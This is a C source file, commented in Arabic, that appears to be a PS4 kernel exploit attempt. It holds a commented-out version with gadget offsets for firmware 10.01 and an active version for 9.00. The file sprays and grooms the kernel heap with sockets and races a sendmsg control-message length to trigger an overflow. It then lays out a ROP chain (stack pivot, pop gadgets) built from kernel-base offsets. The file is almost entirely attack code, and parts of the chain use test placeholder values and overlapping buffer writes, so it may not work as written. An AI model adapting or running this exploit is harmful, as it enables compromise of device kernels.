/*
#include <ps4.h>

// --- الإزاحات (Offsets) لنسخة 10.01 ---
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 
#define OFF_JMP_RSI_3B           0x049C5D 
#define OFF_LEA_RSP_RSI_20_RET   0x72B346 
#define OFF_POP_RBX_R14_RBP_JMP  0x345741 

// --- الإعدادات والهياكل ---
#define CONTROL_LEN 256
#define SPRAY_COUNT 256

struct msghdr {
    void *msg_name; uint32_t msg_namelen; void *msg_iov; int msg_iovlen;
    void *msg_control; uint32_t msg_controllen; int msg_flags;
};
struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };

uint8_t control_buf[CONTROL_LEN];
struct cmsghdr *cmsg;
int global_sock;
int spray_socks[SPRAY_COUNT];

// --- 1. دالة تهيئة الذاكرة (لضمان استقرار الـ Heap) ---
void prepare_heap() {
    for(int i = 0; i < SPRAY_COUNT; i++) {
        spray_socks[i] = syscall(97, 2, 2, 0); 
        if(spray_socks[i] > 0) {
            uint8_t dummy[0x50];
            memset(dummy, 0, 0x50);
            syscall(133, spray_socks[i], dummy, 0x50, 0, NULL, 0);
        }
    }
    for(int i = 0; i < SPRAY_COUNT; i += 2) {
        if(spray_socks[i] > 0) {
            syscall(6, spray_socks[i]); 
            spray_socks[i] = -1;
        }
    }
}

// --- 2. خيوط المعالجة للسباق (Race Condition Threads) ---
void *sendmsg_thread(void *arg) {
    (void)arg;
    struct msghdr msg = {0};
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;
    while(1) {
        syscall(28, global_sock, &msg, 0);
    }
    return NULL;
}

void *race_thread(void *arg) {
    (void)arg;
    while(1) {
        cmsg->cmsg_len = 0x50;   
        cmsg->cmsg_len = 0xFFFF; 
    }
    return NULL;
}

// --- 3. الدالة الرئيسية ---
int _main(struct thread *td) {
    (void)td;
    initKernel();
    initLibc();

    uint64_t kbase = get_kernel_base();
    
    // تعريف خطوات السلسلة
    uintptr_t step1 = (uintptr_t)(kbase + OFF_PUSH_RSP_POP_RSI_RET);
    uintptr_t step2 = (uintptr_t)(kbase + OFF_JMP_RSI_3B);
    uintptr_t step3 = (uintptr_t)(kbase + OFF_LEA_RSP_RSI_20_RET);
    uintptr_t step4 = (uintptr_t)(kbase + OFF_POP_RBX_R14_RBP_JMP);
    
    uintptr_t val_target = 0xDEADC0DE;
    uintptr_t val_extra  = 0xBAADF00D;

    prepare_heap();

    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = 0; 
    cmsg->cmsg_type = 7; 
    cmsg->cmsg_len = 0x50;

    // ملء البفر بالخطوة الأولى (التريجر) لضمان إصابة الكود
    for (int i = 0x48; i < CONTROL_LEN - 8; i += 8) {
        *(uintptr_t *)(control_buf + i) = step1;
    }

    // وضع الخطوة الثانية (القفز لـ RSI+3B)
    for (int i = 0x50; i < 0xA0; i += 8) {
        *(uintptr_t *)(control_buf + i) = step2;
    }

    // وضع الـ Stack Pivot عند الإزاحة 0x3b بالضبط
    *(uintptr_t *)(control_buf + 0x3b) = step3; 

    // تأمين السلسلة عند منطقة الـ RSP الجديد (RSI + 0x20)
    // عند تنفيذ step3، سيبدأ المعالج بسحب العناوين من هنا:
    *(uintptr_t *)(control_buf + 0x20) = step4;      // سيؤدي لـ pop rbx; pop r14...
    *(uintptr_t *)(control_buf + 0x28) = val_target; // ستذهب إلى RBX
    *(uintptr_t *)(control_buf + 0x30) = val_extra;  // ستذهب إلى R14
    *(uintptr_t *)(control_buf + 0x38) = step3;      // تكرار الحماية لضمان عدم الخروج من السلسلة

    global_sock = syscall(97, 2, 2, 0);

    ScePthread t1, t2;
    scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&t2, NULL, race_thread, NULL, "thr_race");

    scePthreadJoin(t1, NULL);
    scePthreadJoin(t2, NULL);

    return 0;
}
*/

#include <ps4.h>

// --- الإزاحات (Offsets) المستخرجة لنسخة 9.00 ---
#define OFF_PUSH_RSP_POP_RSI_RET 0x7B687A  // push rsp ; pop rsi ; ret
#define OFF_JMP_RSI_3D           0x596603  // jmp qword ptr [rsi + 0x3d] (FIRST_GADGET)
#define OFF_LEA_RSP_RSI_20_RET   0x541e46  // lea rsp, [rsi + 0x20] ; repz ret
#define OFF_POP_RBX_R14_RBP_JMP  0x1B4151  // pop rbx ; pop r14 ; pop rbp ; jmp qword ptr [rsi + 0x10]

// --- الإعدادات ---
#define CONTROL_LEN 256
#define SPRAY_COUNT 256

struct msghdr {
    void *msg_name; uint32_t msg_namelen; void *msg_iov; int msg_iovlen;
    void *msg_control; uint32_t msg_controllen; int msg_flags;
};
struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };

uint8_t control_buf[CONTROL_LEN];
struct cmsghdr *cmsg;
int global_sock;
int spray_socks[SPRAY_COUNT];

// --- 1. تهيئة الذاكرة (Mbuf Spray) لنسخة 9.00 ---
void prepare_heap() {
    for(int i = 0; i < SPRAY_COUNT; i++) {
        spray_socks[i] = syscall(97, 2, 2, 0); // socket
        if(spray_socks[i] > 0) {
            uint8_t dummy[0x50];
            memset(dummy, 0, 0x50);
            syscall(133, spray_socks[i], dummy, 0x50, 0, NULL, 0); // sendto
        }
    }
    // إحداث ثقوب في الذاكرة (Heap Grooming)
    for(int i = 0; i < SPRAY_COUNT; i += 2) {
        if(spray_socks[i] > 0) {
            syscall(6, spray_socks[i]); // close
            spray_socks[i] = -1;
        }
    }
}

// --- 2. خيوط السباق (Race Threads) ---
void *sendmsg_thread(void *arg) {
    (void)arg;
    struct msghdr msg = {0};
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;
    while(1) {
        syscall(28, global_sock, &msg, 0); // sendmsg
    }
    return NULL;
}

void *race_thread(void *arg) {
    (void)arg;
    while(1) {
        cmsg->cmsg_len = 0x50;   
        cmsg->cmsg_len = 0xFFFF; // محاولة إحداث الـ Overflow
    }
    return NULL;
}

int _main(struct thread *td) {
    (void)td;
    initKernel();
    initLibc();

    uint64_t kbase = get_kernel_base();
    // حساب العناوين الحقيقية (Kbase + Offset)
    uintptr_t step1 = (uintptr_t)(kbase + OFF_PUSH_RSP_POP_RSI_RET);
    uintptr_t step2 = (uintptr_t)(kbase + OFF_JMP_RSI_3D);
    uintptr_t step3 = (uintptr_t)(kbase + OFF_LEA_RSP_RSI_20_RET);
    uintptr_t step4 = (uintptr_t)(kbase + OFF_POP_RBX_R14_RBP_JMP);

    uintptr_t val_target = 0x1337C0DE; // القيمة الاختبارية لـ RBX
    uintptr_t val_extra  = 0x90909090; 

    prepare_heap();

    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = 0; 
    cmsg->cmsg_type = 7; 
    cmsg->cmsg_len = 0x50;

    // ملء البفر بالخطوة الأولى (التريجر)
    for (int i = 0x48; i < CONTROL_LEN - 8; i += 8) {
        *(uintptr_t *)(control_buf + i) = step1;
    }

    // الخطوة الثانية: القفز لـ RSI+0x3D
    for (int i = 0x50; i < 0xB0; i += 8) {
        *(uintptr_t *)(control_buf + i) = step2;
    }

    // --- [ لنسخة 9.00 ] ---
    // القفزة في 9.00 هي RSI + 0x3d
    *(uintptr_t *)(control_buf + 0x3d) = step3; // وضع الـ Stack Pivot هنا

    // منطقة الـ RSP الجديد (RSI + 0x20)
    *(uintptr_t *)(control_buf + 0x20) = step4;      // pop rbx; pop r14...
    *(uintptr_t *)(control_buf + 0x28) = val_target; // ستظهر في RBX عند النجاح
    *(uintptr_t *)(control_buf + 0x30) = val_extra;  // ستظهر في R14
    *(uintptr_t *)(control_buf + 0x38) = step1;      // العودة للسلسلة الآمنة

    global_sock = syscall(97, 2, 2, 0);

    ScePthread t1, t2;
    scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&t2, NULL, race_thread, NULL, "thr_race");

    scePthreadJoin(t1, NULL);
    scePthreadJoin(t2, NULL);

    return 0;
}
